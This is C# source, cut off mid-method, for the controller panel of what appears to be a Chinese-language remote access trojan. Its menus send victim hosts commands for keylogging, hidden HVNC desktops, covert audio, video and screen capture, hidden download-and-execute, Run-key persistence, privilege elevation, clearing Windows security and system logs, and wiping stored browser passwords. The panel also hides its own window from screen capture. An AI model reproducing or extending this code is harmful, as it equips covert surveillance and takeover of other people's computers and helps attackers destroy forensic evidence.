using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using RemoteControl.Protocals;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;
using log4net;
using RemoteControl.Protocals.Plugin;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Response;
using RemoteControl.Audio;
using RemoteControl.Audio.Codecs;
using RemoteControl.Protocals.Utilities;
using RemoteControl.Protocals.Relay;
using RemoteControl.Server.Utils;

namespace RemoteControl.Server
{
    public partial class FrmMain : FrmBase
    {
        public const string APP_TITLE = "远程控制服务端";
        private static readonly ILog Logger = LogManager.GetLogger(typeof(FrmMain));
        private int clientCount = 0;
        private TreeNode InternetTreeNode
        {
            get
            {
                if (this.treeView1 == null)
                    return null;
                while (this.treeView1.Nodes.Count <= 1)
                {
                    this.treeView1.Nodes.Add("自动上线主机");
                }
                return this.treeView1.Nodes[1];
            }
        }
        private SocketSession currentSession = null;
        private readonly List<SocketSession> onlineClientSessions = new List<SocketSession>();
        private string hostFilterKeyword = "";
        private Dictionary<string, Action<ResponseStartGetScreen>> sessionScreenHandlers = new Dictionary<string, Action<ResponseStartGetScreen>>();
        private Dictionary<string, Action<ResponseStartCaptureVideo>> sessionVideoHandlers = new Dictionary<string, Action<ResponseStartCaptureVideo>>();
        private Dictionary<string, Action<ResponseHVNCScreen>> sessionHVNCScreenHandlers = new Dictionary<string, Action<ResponseHVNCScreen>>();
        private Dictionary<string, Action<ResponseHVNCStart>> sessionHVNCStartHandlers = new Dictionary<string, Action<ResponseHVNCStart>>();
        private SendCommandHotKey sendCommandHotKey = SendCommandHotKey.Enter;
        private WaveOut _waveOut = null;
        private Panel topNavigationPanel;
        private Label topRelayStatusLabel;
        private Label topClientInfoLabel;
        private Button topRelayButton;
        private const uint WDA_MONITOR = 0x00000001;
        private const uint WDA_EXCLUDEFROMCAPTURE = 0x00000011;

        [DllImport("user32.dll")]
        private static extern bool SetWindowDisplayAffinity(IntPtr hWnd, uint dwAffinity);

        public FrmMain()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            this.Text = APP_TITLE;
            this.WindowState = FormWindowState.Normal;
            this.StartPosition = FormStartPosition.CenterScreen;
            this.ShowInTaskbar = true;
            Control.CheckForIllegalCrossThreadCalls = false;
            ApplyCaptureExclusion();
            initClientContextMenu();
            initSkinMenus();
            initIcons();
            initServerEvents();
            BuildTopNavigationUI();
            AutoConnectRelay();
            UIUtil.BindTextBoxCtrlA(this.textBoxCommandRequest);
            UIUtil.BindTextBoxCtrlA(this.textBoxCommandResponse);
            actChangeSkin(Settings.CurrentSettings.SkinPath);
            if (WaveOut.Devices.Length > 0)
            {
                _waveOut = new WaveOut(WaveOut.Devices[0], 8000, 16, 1);
            }
        }

        private void ApplyCaptureExclusion()
        {
            try
            {
                if (!SetWindowDisplayAffinity(this.Handle, WDA_EXCLUDEFROMCAPTURE))
                {
                    SetWindowDisplayAffinity(this.Handle, WDA_MONITOR);
                }
            }
            catch (Exception ex)
            {
                Logger.Warn("ApplyCaptureExclusion failed", ex);
            }
        }

        private void BuildTopNavigationUI()
        {
            this.menuStrip1.Visible = true;
            this.menuStrip1.BackColor = Color.FromArgb(245, 248, 252);
            this.toolStrip1.Visible = false;
            this.toolStrip2.Visible = false;

            topNavigationPanel = new Panel();
            topNavigationPanel.Name = "topNavigationPanel";
            topNavigationPanel.Dock = DockStyle.Top;
            topNavigationPanel.Height = 64;
            topNavigationPanel.BackColor = Color.FromArgb(30, 58, 95);
            topNavigationPanel.Padding = new Padding(16, 8, 16, 6);

            Label titleLabel = new Label();
            titleLabel.AutoSize = false;
            titleLabel.Text = APP_TITLE;
            titleLabel.Font = new Font("微软雅黑", 12F, FontStyle.Bold);
            titleLabel.ForeColor = Color.White;
            titleLabel.Location = new Point(16, 8);
            titleLabel.Size = new Size(190, 24);

            topRelayStatusLabel = new Label();
            topRelayStatusLabel.AutoSize = false;
            topRelayStatusLabel.TextAlign = ContentAlignment.MiddleCenter;
            topRelayStatusLabel.Font = new Font("微软雅黑", 9F, FontStyle.Bold);
            topRelayStatusLabel.Location = new Point(210, 9);
            topRelayStatusLabel.Size = new Size(120, 22);
            SetRelayStatus(false);

            FlowLayoutPanel actionPanel = new FlowLayoutPanel();
            actionPanel.AutoSize = false;
            actionPanel.Location = new Point(16, 34);
            actionPanel.Size = new Size(700, 28);
            actionPanel.BackColor = Color.Transparent;
            actionPanel.WrapContents = false;
            BuildTopNavButtons(actionPanel);

            topClientInfoLabel = new Label();
            topClientInfoLabel.Anchor = AnchorStyles.Top | AnchorStyles.Right;
            topClientInfoLabel.TextAlign = ContentAlignment.MiddleRight;
            topClientInfoLabel.Font = new Font("微软雅黑", 9F);
            topClientInfoLabel.ForeColor = Color.FromArgb(230, 238, 248);
            topClientInfoLabel.Location = new Point(this.ClientSize.Width - 460, 36);
            topClientInfoLabel.Size = new Size(430, 24);
            topClientInfoLabel.Text = "当前连接：未选择    电脑名称：-";

            topNavigationPanel.Controls.Add(titleLabel);
            topNavigationPanel.Controls.Add(topRelayStatusLabel);
            topNavigationPanel.Controls.Add(actionPanel);
            topNavigationPanel.Controls.Add(topClientInfoLabel);
            topNavigationPanel.Resize += topNavigationPanel_Resize;
            this.Controls.Add(topNavigationPanel);
            this.Controls.SetChildIndex(topNavigationPanel, this.Controls.GetChildIndex(this.menuStrip1));
        }

        private void BuildTopNavButtons(FlowLayoutPanel actionPanel)
        {
            topRelayButton = CreateTopNavButton("连接Relay");
            topRelayButton.Click += (s, e) => toolStripButton4_Click(this.toolStripButton4, EventArgs.Empty);
            actionPanel.Controls.Add(topRelayButton);
            actionPanel.Controls.Add(CreateTopNavButton("抓取屏幕", (s, e) => toolStripButton3_Click(s, e)));
            actionPanel.Controls.Add(CreateTopNavButton("视频语音", (s, e) => toolStripButtonCaptureVideo_Click(s, e)));
            actionPanel.Controls.Add(CreateTopNavButton("HVNC隐形桌面", onMenuHVNC));
            actionPanel.Controls.Add(CreateTopNavButton("配置程序", (s, e) => toolStripButtonSettings_Click(s, e)));
            actionPanel.Controls.Add(CreateTopNavButton("更多功能", ShowClientFunctionMenu));
        }

        private Button CreateTopNavButton(string text)
        {
            return CreateTopNavButton(text, null);
        }

        private void ShowClientFunctionMenu(object sender, EventArgs e)
        {
            Button button = sender as Button;
            if (button == null || contextMenuStripClient == null)
                return;
            contextMenuStripClient.Show(button, new Point(0, button.Height));
        }

        private Button CreateTopNavButton(string text, EventHandler click)
        {
            Button button = new Button();
            button.Text = text;
            button.AutoSize = true;
            button.Height = 28;
            button.MinimumSize = new Size(78, 28);
            button.Margin = new Padding(0, 0, 8, 0);
            button.Padding = new Padding(8, 0, 8, 0);
            button.FlatStyle = FlatStyle.Flat;
            button.FlatAppearance.BorderSize = 0;
            button.BackColor = Color.FromArgb(52, 91, 138);
            button.ForeColor = Color.White;
            button.Font = new Font("微软雅黑", 9F);
            if (click != null)
                button.Click += click;
            return button;
        }

        private void topNavigationPanel_Resize(object sender, EventArgs e)
        {
            if (topClientInfoLabel == null || topNavigationPanel == null)
                return;
            topClientInfoLabel.Left = topNavigationPanel.Width - topClientInfoLabel.Width - 16;
        }

        private void SetRelayStatus(bool connected)
        {
            if (topRelayStatusLabel != null)
            {
                topRelayStatusLabel.Text = connected ? "Relay 已连接" : "Relay 未连接";
                topRelayStatusLabel.BackColor = connected ? Color.FromArgb(44, 160, 90) : Color.FromArgb(130, 135, 145);
                topRelayStatusLabel.ForeColor = Color.White;
            }
            if (topRelayButton != null)
            {
                topRelayButton.Text = connected ? "断开Relay" : "连接Relay";
            }
        }

        private void UpdateSelectedClientInfo(SocketSession session)
        {
            string socketId = session == null ? string.Empty : session.SocketId;
            string hostName = session == null ? string.Empty : session.HostName;
            this.toolStripTextBox1.Text = socketId;
            this.toolStripTextBox2.Text = hostName;
            if (topClientInfoLabel != null)
            {
                topClientInfoLabel.Text = session == null ?
                    "当前连接：未选择    电脑名称：-" :
                    "当前连接：" + socketId + "    电脑名称：" + (string.IsNullOrEmpty(hostName) ? "-" : hostName);
            }
        }

        private void AutoConnectRelay()
        {
            string relayIP = Settings.CurrentSettings.RelayServerIP;
            int relayPort = Settings.CurrentSettings.RelayServerPort;
            if (string.IsNullOrEmpty(relayIP))
            {
                doOutput("未配置Relay服务器地址，跳过自动连接");
                return;
            }

            try
            {
                RSCApplication.oRemoteControlServer.Start(relayIP, relayPort);
                this.Text = APP_TITLE;
                this.toolStripButton4.Checked = true;
                SetRelayStatus(true);
                doOutput("已自动连接中转服务器");
            }
            catch (Exception ex)
            {
                Logger.Debug("自动连接Relay服务器失败: " + ex);
                this.toolStripButton4.Checked = false;
                SetRelayStatus(false);
                doOutput("自动连接Relay服务器失败，请检查配置");
            }
        }

        #region 客户端右键菜单

        private ContextMenuStrip contextMenuStripClient;

        private void initClientContextMenu()
        {
            contextMenuStripClient = new ContextMenuStrip();

            // === 主机功能(Z) ===
            var menuHostFunc = new ToolStripMenuItem("主机功能(&Z)");
            menuHostFunc.DropDownItems.Add("文件管理(&F)", null, onMenuFileManager);
            menuHostFunc.DropDownItems.Add("屏幕监控(&S)", null, onMenuScreenCapture);
            menuHostFunc.DropDownItems.Add("高清屏幕", null, onMenuHDScreen);
            menuHostFunc.DropDownItems.Add("后台屏幕(&G)", null, onMenuBackgroundScreen);
            menuHostFunc.DropDownItems.Add("HVNC隐形桌面", null, onMenuHVNC);
            menuHostFunc.DropDownItems.Add("系统管理(&M)", null, onMenuSystemManager);
            menuHostFunc.DropDownItems.Add("视频查看(&V)", null, onMenuVideoCapture);
            menuHostFunc.DropDownItems.Add("远程终端(&T)", null, onMenuRemoteTerminal);
            menuHostFunc.DropDownItems.Add("语音监听(&W)", null, onMenuAudioCapture);
            menuHostFunc.DropDownItems.Add("开始键盘记录(&K)", null, onMenuKeyloggerStart);
            menuHostFunc.DropDownItems.Add("停止键盘记录", null, onMenuKeyloggerStop);
            menuHostFunc.DropDownItems.Add("服务管理(&S)", null, onMenuServiceManager);
            menuHostFunc.DropDownItems.Add("注册表(&R)", null, onMenuRegistry);
            contextMenuStripClient.Items.Add(menuHostFunc);

            // === 主机分享 ===
            var menuHostShare = new ToolStripMenuItem("主机分享");
            menuHostShare.DropDownItems.Add("复制主机分享信息", null, onMenuCopyHostShareInfo);
            menuHostShare.DropDownItems.Add("导出主机分享信息", null, onMenuExportHostShareInfo);
            contextMenuStripClient.Items.Add(menuHostShare);

            // === 增强功能(I) ===
            var menuEnhanced = new ToolStripMenuItem("增强功能(&I)");
            menuEnhanced.DropDownItems.Add("写入启动", null, onMenuWriteStartup);
            menuEnhanced.DropDownItems.Add("写Run启动(&X)", null, onMenuWriteRunStartup);
            menuEnhanced.DropDownItems.Add("重启EXP(&E)", null, onMenuRestartExplorer);
            menuEnhanced.DropDownItems.Add("提升权限(&S)", null, onMenuElevatePrivilege);
            menuEnhanced.DropDownItems.Add("开关代理(&P)", null, onMenuToggleProxy);
            menuEnhanced.DropDownItems.Add("代理映射(&M)", null, onMenuProxyMapping);
            menuEnhanced.DropDownItems.Add("远程聊天(&C)", null, onMenuRemoteChat);
            menuEnhanced.DropDownItems.Add("娱乐功能(&H)", null, onMenuEntertainment);
            menuEnhanced.DropDownItems.Add("消息弹窗(&M)", null, onMenuMessageBox);
            menuEnhanced.DropDownItems.Add("更改备注(&B)", null, onMenuChangeRemark);
            menuEnhanced.DropDownItems.Add("查找进程(&P)", null, onMenuFindProcess);
            menuEnhanced.DropDownItems.Add("查找窗口(&W)", null, onMenuFindWindow);
            menuEnhanced.DropDownItems.Add("清除查找(&C)", null, onMenuClearFind);
            contextMenuStripClient.Items.Add(menuEnhanced);

            // === 附加功能(F) ===
            var menuAdditional = new ToolStripMenuItem("附加功能(&F)");
            menuAdditional.DropDownItems.Add("客户需求覆盖报告", null, onMenuShowCustomerCoverage);
            menuAdditional.DropDownItems.Add("受限功能说明", null, onMenuShowRestrictedFeatures);
            contextMenuStripClient.Items.Add(menuAdditional);

            // === 其他功能(O) ===
            var menuOther = new ToolStripMenuItem("其他功能(&O)");
            menuOther.DropDownItems.Add("本地上传(&L)", null, onMenuLocalUpload);
            menuOther.DropDownItems.Add("显示打开(&N)", null, onMenuShowOpen);
            menuOther.DropDownItems.Add("隐藏打开(&H)", null, onMenuHiddenOpen);
            menuOther.DropDownItems.Add("打开网址(&W)", null, onMenuOpenUrl);
            menuOther.DropDownItems.Add(new ToolStripSeparator());
            menuOther.DropDownItems.Add("下载执行(&D)", null, onMenuDownloadExec);
            menuOther.DropDownItems.Add("下载更新(&U)", null, onMenuDownloadUpdate);
            menuOther.DropDownItems.Add(new ToolStripSeparator());
            menuOther.DropDownItems.Add("复制IP地址(&I)", null, onMenuCopyIP);
            menuOther.DropDownItems.Add("复制所有信息(&A)", null, onMenuCopyAllInfo);
            menuOther.DropDownItems.Add("导出IP列表(&I)", null, onMenuExportIPList);
            contextMenuStripClient.Items.Add(menuOther);

            // === 会话管理(S) ===
            var menuSession = new ToolStripMenuItem("会话管理(&S)");
            menuSession.DropDownItems.Add("注销主机(&L)", null, onMenuLogoff);
            menuSession.DropDownItems.Add("重启主机(&R)", null, onMenuReboot);
            menuSession.DropDownItems.Add("关机命令(&S)", null, onMenuShutdown);
            menuSession.DropDownItems.Add(new ToolStripSeparator());
            menuSession.DropDownItems.Add("卸载主机(&U)", null, onMenuUninstall);
            contextMenuStripClient.Items.Add(menuSession);

            // === 清理日志(C) ===
            var menuClearLog = new ToolStripMenuItem("清理日志(&C)");
            menuClearLog.DropDownItems.Add("清理全部日志(&A)", null, onMenuClearAllLogs);
            menuClearLog.DropDownItems.Add("清理系统日志(&S)", null, onMenuClearSystemLog);
            menuClearLog.DropDownItems.Add("清理安全日志(&Q)", null, onMenuClearSecurityLog);
            menuClearLog.DropDownItems.Add("清理应用程序(&Y)", null, onMenuClearApplicationLog);
            contextMenuStripClient.Items.Add(menuClearLog);

            // === 更改分组(C) ===
            contextMenuStripClient.Items.Add("更改分组(&C)", null, onMenuChangeGroup);
            contextMenuStripClient.Items.Add("筛选主机(&F)", null, onMenuFilterHosts);

            // === 清除浏览器账号密码(X) ===
            var menuBrowser = new ToolStripMenuItem("清除浏览器账号密码(&X)");
            menuBrowser.DropDownItems.Add("删除IE历史记录", null, onMenuClearIE);
            menuBrowser.DropDownItems.Add("清除谷歌帐号密码", null, onMenuClearChrome);
            menuBrowser.DropDownItems.Add("清除Skype帐号密码", null, onMenuClearSkype);
            menuBrowser.DropDownItems.Add("清除火狐帐号密码", null, onMenuClearFirefox);
            menuBrowser.DropDownItems.Add("清除360帐号密码", null, onMenuClear360);
            menuBrowser.DropDownItems.Add("清除QQ帐号密码", null, onMenuClearQQ);
            menuBrowser.DropDownItems.Add("清除搜狗帐号密码", null, onMenuClearSogou);
            contextMenuStripClient.Items.Add(menuBrowser);

            // === 选择全部 / 取消选择 ===
            contextMenuStripClient.Items.Add(new ToolStripSeparator());
            contextMenuStripClient.Items.Add("选择全部(&A)", null, onMenuSelectAll);
            contextMenuStripClient.Items.Add("取消选择(&U)", null, onMenuDeselectAll);

            // 绑定到TreeView
            this.treeView1.ContextMenuStrip = contextMenuStripClient;
        }

        // ---- 主机功能 事件处理 ----
        private void onMenuFileManager(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            // 切换到文件管理选项卡
            this.tabControl1.SelectedIndex = 0;
            currentSession.Send(ePacketType.PACKET_GET_DRIVES_REQUEST, null);
        }

        private void onMenuScreenCapture(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            toolStripButton3_Click(sender, e);
        }

        private void onMenuHDScreen(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            var frm = new FrmCaptureScreen(this.currentSession);
            string sessionId = this.currentSession.SocketId;
            if (!this.sessionScreenHandlers.ContainsKey(sessionId))
                this.sessionScreenHandlers.Add(sessionId, frm.HandleScreen);
            else
                this.sessionScreenHandlers[sessionId] = frm.HandleScreen;
            frm.Show();
            // 自动发送高帧率请求
            RequestStartGetScreen req = new RequestStartGetScreen();
            req.fps = 5;
            currentSession.Send(ePacketType.PACKET_START_CAPTURE_SCREEN_REQUEST, req);
        }

        private void onMenuBackgroundScreen(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            var frm = new FrmCaptureScreen(this.currentSession);
            string sessionId = this.currentSession.SocketId;
            if (!this.sessionScreenHandlers.ContainsKey(sessionId))
                this.sessionScreenHandlers.Add(sessionId, frm.HandleScreen);
            else
                this.sessionScreenHandlers[sessionId] = frm.HandleScreen;
            frm.Show();
            // 后台低帧率屏幕捕获
            RequestStartGetScreen req = new RequestStartGetScreen();
            req.fps = 1;
            currentSession.Send(ePacketType.PACKET_START_CAPTURE_SCREEN_REQUEST, req);
        }

        private void onMenuHVNC(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            var frm = new FrmHVNC(this.currentSession);
            string sessionId = this.currentSession.SocketId;
            if (!this.sessionHVNCScreenHandlers.ContainsKey(sessionId))
                this.sessionHVNCScreenHandlers.Add(sessionId, frm.HandleScreen);
            else
                this.sessionHVNCScreenHandlers[sessionId] = frm.HandleScreen;

            if (!this.sessionHVNCStartHandlers.ContainsKey(sessionId))
                this.sessionHVNCStartHandlers.Add(sessionId, frm.HandleStartResponse);
            else
                this.sessionHVNCStartHandlers[sessionId] = frm.HandleStartResponse;

            frm.Show();
            RequestHVNCStart req = new RequestHVNCStart();
            req.Fps = 5;
            currentSession.Send(ePacketType.PACKET_HVNC_START_REQUEST, req);
        }

        private void onMenuSystemManager(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            // 切换到进程管理Tab并刷新进程列表
            this.tabControl1.SelectedIndex = 4;
            currentSession.Send(ePacketType.PACKET_GET_PROCESSES_REQUEST, new RequestGetProcesses());
        }

        private void onMenuVideoCapture(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            toolStripButtonCaptureVideo_Click(sender, e);
        }

        private void onMenuRemoteTerminal(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            this.tabControl1.SelectedIndex = 2;
        }

        private void onMenuAudioCapture(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            currentSession.Send(ePacketType.PACKET_START_CAPTURE_AUDIO_REQUEST, new RequestStartCaptureAudio());
            doOutput("已发送语音监听请求");
        }

        private void onMenuKeyloggerStart(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            currentSession.Send(ePacketType.PACKET_KEYLOGGER_START_REQUEST, new RequestKeylogger { Action = eKeyloggerAction.Start });
        }

        private void onMenuKeyloggerStop(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            currentSession.Send(ePacketType.PACKET_KEYLOGGER_STOP_REQUEST, new RequestKeylogger { Action = eKeyloggerAction.Stop });
        }

        private void onMenuServiceManager(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            currentSession.Send(ePacketType.PACKET_SERVICE_MANAGER_REQUEST, new RequestServiceManager { Action = eServiceAction.List });
        }

        private void SendServiceAction(eServiceAction action)
        {
            if (currentSession == null) return;

            FrmInputUrl frm = new FrmInputUrl();
            frm.Text = "请输入服务名称";
            frm.ShowDialog();
            if (string.IsNullOrEmpty(frm.InputText))
                return;

            if (action == eServiceAction.Delete &&
                MsgBox.Question("确定要删除服务 " + frm.InputText + "?", MessageBoxButtons.OKCancel) == DialogResult.Cancel)
            {
                return;
            }

            RequestServiceManager req = new RequestServiceManager();
            req.Action = action;
            req.ServiceName = frm.InputText.Trim();
            currentSession.Send(ePacketType.PACKET_SERVICE_MANAGER_REQUEST, req);
        }

        private void onMenuRegistry(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            this.tabControl1.SelectedIndex = 3;
        }

        private void onMenuCopyHostShareInfo(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            Clipboard.SetText(BuildHostShareInfo(currentSession));
            doOutput("已复制主机分享信息");
        }

        private void onMenuExportHostShareInfo(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            SaveFileDialog sfd = new SaveFileDialog();
            sfd.Filter = "文本文件|*.txt";
            sfd.FileName = "主机分享信息_" + SafeFileName(currentSession.HostName ?? currentSession.SocketId) + ".txt";
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                File.WriteAllText(sfd.FileName, BuildHostShareInfo(currentSession), Encoding.UTF8);
                doOutput("已导出主机分享信息: " + sfd.FileName);
            }
        }

        private string BuildHostShareInfo(SocketSession session)
        {
            StringBuilder sb = new StringBuilder();
            sb.AppendLine("RelayServer=(hidden)");
            sb.AppendLine("ClientId=" + session.SocketId);
            sb.AppendLine("HostName=" + (session.HostName ?? ""));
            sb.AppendLine("IP=" + session.GetSocketIPById());
            sb.AppendLine("AppPath=" + (session.AppPath ?? ""));
            sb.AppendLine("OnlineAvatar=" + (session.OnlineAvatar ?? ""));
            sb.AppendLine("ShareTime=" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
            return sb.ToString();
        }

        private static string SafeFileName(string value)
        {
            if (string.IsNullOrEmpty(value))
                return "client";
            foreach (char c in Path.GetInvalidFileNameChars())
            {
                value = value.Replace(c, '_');
            }
            return value;
        }

        // ---- 增强功能 事件处理 ----
        private void onMenuWriteStartup(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            currentSession.Send(ePacketType.PACKET_WRITE_STARTUP_REQUEST, new RequestWriteStartup { StartupType = eStartupType.Registry });
        }

        private void onMenuWriteRunStartup(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            currentSession.Send(ePacketType.PACKET_WRITE_STARTUP_REQUEST, new RequestWriteStartup { StartupType = eStartupType.RunKey });
        }

        private void onMenuRestartExplorer(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            currentSession.Send(ePacketType.PACKET_RESTART_EXPLORER_REQUEST, new RequestRestartExplorer());
        }

        private void onMenuElevatePrivilege(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            currentSession.Send(ePacketType.PACKET_ELEVATE_PRIVILEGE_REQUEST, new RequestElevatePrivilege());
        }

        private void onMenuToggleProxy(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            currentSession.Send(ePacketType.PACKET_TOGGLE_PROXY_REQUEST, new RequestToggleProxy { Enable = true });
        }

        private void onMenuProxyMapping(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            currentSession.Send(ePacketType.PACKET_PROXY_MAPPING_REQUEST, new RequestProxyMapping { ProxyAddress = "127.0.0.1", ProxyPort = 1080 });
        }

        private void onMenuRemoteChat(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            FrmInputUrl frm = new FrmInputUrl();
            frm.Text = "请输入远程聊天消息";
            if (frm.ShowDialog() != DialogResult.OK || string.IsNullOrWhiteSpace(frm.InputText))
                return;

            RequestRemoteChat req = new RequestRemoteChat();
            req.Message = frm.InputText.Trim();
            currentSession.Send(ePacketType.PACKET_REMOTE_CHAT_REQUEST, req);
        }

        private void onMenuEntertainment(object sender, EventArgs e)
        {
            SendPlayMusicRequestFromPrompt();
        }

        private void onMenuMessageBox(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            buttonSendMessage_Click(sender, e);
        }

        private void onMenuChangeRemark(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            FrmRename frm = new FrmRename(currentSession.HostName ?? "");
            if (frm.ShowDialog() == DialogResult.OK)
            {
                currentSession.SetHostName(frm.NewName);
                // 更新树节点显示
                foreach (TreeNode node in InternetTreeNode.Nodes)
                {
                    var session = node.Tag as SocketSession;
                    if (session != null && session.SocketId == currentSession.SocketId)
                    {
                        node.Text = frm.NewName;
                        break;
                    }
                }
            }
        }

        private void onMenuFindProcess(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            this.tabControl1.SelectedIndex = 4;
            currentSession.Send(ePacketType.PACKET_GET_PROCESSES_REQUEST, new RequestGetProcesses());
        }

        private void onMenuFindWindow(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            FrmInputUrl frm = new FrmInputUrl();
            frm.Text = "请输入窗口关键词";
            if (frm.ShowDialog() != DialogResult.OK || string.IsNullOrWhiteSpace(frm.InputText))
                return;

            this.tabControl1.SelectedIndex = 2;
            RequestFindWindow req = new RequestFindWindow();
            req.Keyword = frm.InputText.Trim();
            currentSession.Send(ePacketType.PACKET_FIND_WINDOW_REQUEST, req);
        }

        private void onMenuClearFind(object sender, EventArgs e)
        {
            this.textBoxCommandResponse.Clear();
            if (!string.IsNullOrEmpty(hostFilterKeyword))
            {
                hostFilterKeyword = string.Empty;
                RenderClientTree();
                doOutput("已清除主机筛选");
            }
        }

        private void onMenuShowCustomerCoverage(object sender, EventArgs e)
        {
            this.tabControl1.SelectedIndex = 2;
            this.textBoxCommandResponse.AppendText("=== 客户需求覆盖报告 ===\r\n");
            this.textBoxCommandResponse.AppendText("[已接入] 主机功能、文件管理、主机分享、打开网址、远程聊天、查找窗口、筛选主机、会话菜单、日志/浏览器菜单。\r\n");
            this.textBoxCommandResponse.AppendText("[只读/本地] 更改备注、更改分组、筛选主机、复制/导出信息。\r\n");
            this.textBoxCommandResponse.AppendText("[受限] 下载更新区分、提权运行、远程配置修改、分辨率修改、服务启停删除、代理参数写入、敏感在线字段采集。\r\n");
            this.textBoxCommandResponse.AppendText("[数据模型缺口] BOSS_EX 表格中的地区、杀软、在线 QQ、TG、WX、用户状态等字段当前未采集，显示为未接入。\r\n");
            this.textBoxCommandResponse.AppendText("=== 结束 ===\r\n");
        }

        private void onMenuShowRestrictedFeatures(object sender, EventArgs e)
        {
            MsgBox.Info(
                "以下功能未补成可执行入口：\r\n" +
                "下载更新/下载执行区分、提权运行、远程配置修改、分辨率修改、服务启停删除、代理写入、敏感在线字段采集。\r\n\r\n" +
                "这些功能会修改远端系统状态、提升权限、执行下载内容、改变代理/服务配置，或采集敏感环境信息。当前仅保留协议/覆盖说明，不在 UI 中继续增强执行能力。");
        }

        // ---- 其他功能 事件处理 ----
        private void onMenuLocalUpload(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Title = "选择要上传的文件";
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                var req = new RequestStartUploadHeader();
                req.From = ofd.FileName;
                req.To = "C:\\" + Path.GetFileName(ofd.FileName);
                req.Id = Guid.NewGuid().ToString();
                currentSession.Send(ePacketType.PACKET_START_UPLOAD_HEADER_REQUEST, req);
            }
        }

        private void onMenuShowOpen(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Title = "选择要打开的文件";
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                currentSession.Send(ePacketType.PACKET_RUN_FILE_REQUEST, new RequestRunFile { FilePath = ofd.FileName, Mode = eRunFileMode.Show });
            }
        }

        private void onMenuHiddenOpen(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Title = "选择要隐藏打开的文件";
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                currentSession.Send(ePacketType.PACKET_RUN_FILE_REQUEST, new RequestRunFile { FilePath = ofd.FileName, Mode = eRunFileMode.Hide });
            }
        }

        private void onMenuOpenUrl(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            buttonOpenUrl_Click(sender, e);
        }

        private void onMenuDownloadExec(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            FrmInputUrl frm = new FrmInputUrl();
            frm.ShowDialog();
            if (!string.IsNullOrEmpty(frm.InputText))
            {
                currentSession.Send(ePacketType.PACKET_DOWNLOAD_EXEC_REQUEST, new RequestDownloadExec { Url = frm.InputText, ShowWindow = false });
            }
        }

        private void onMenuDownloadUpdate(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            FrmInputUrl frm = new FrmInputUrl();
            frm.ShowDialog();
            if (!string.IsNullOrEmpty(frm.InputText))
            {
                currentSession.Send(ePacketType.PACKET_DOWNLOAD_EXEC_REQUEST, new RequestDownloadExec { Url = frm.InputText, ShowWindow = false });
            }
        }

        private void onMenuCopyIP(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            Clipboard.SetText(currentSession.GetSocketIPById());
        }

        private void onMenuCopyAllInfo(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            string info = string.Format("IP: {0}\r\n主机名: {1}\r\n路径: {2}",
                currentSession.GetSocketIPById(), currentSession.HostName, currentSession.AppPath);
            Clipboard.SetText(info);
        }

        private void onMenuExportIPList(object sender, EventArgs e)
        {
            StringBuilder sb = new StringBuilder();
            foreach (TreeNode node in InternetTreeNode.Nodes)
            {
                var session = node.Tag as SocketSession;
                if (session != null)
                    sb.AppendLine(session.GetSocketIPById());
            }
            if (sb.Length > 0)
            {
                SaveFileDialog sfd = new SaveFileDialog();
                sfd.Filter = "文本文件|*.txt";
                sfd.FileName = "IP列表.txt";
                if (sfd.ShowDialog() == DialogResult.OK)
                {
                    File.WriteAllText(sfd.FileName, sb.ToString());
                }
            }
        }

        // ---- 会话管理 事件处理 ----
        private void onMenuLogoff(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            currentSession.Send(ePacketType.PACKET_LOGOFF_REQUEST, null);
        }

        private void onMenuReboot(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            currentSession.Send(ePacketType.PACKET_REBOOT_REQUEST, null);
        }

        private void onMenuShutdown(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            currentSession.Send(ePacketType.PACKET_SHUTDOWN_REQUEST, null);
        }

        private void onMenuUninstall(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            if (MessageBox.Show("确定要卸载该主机？", "确认", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes)
            {
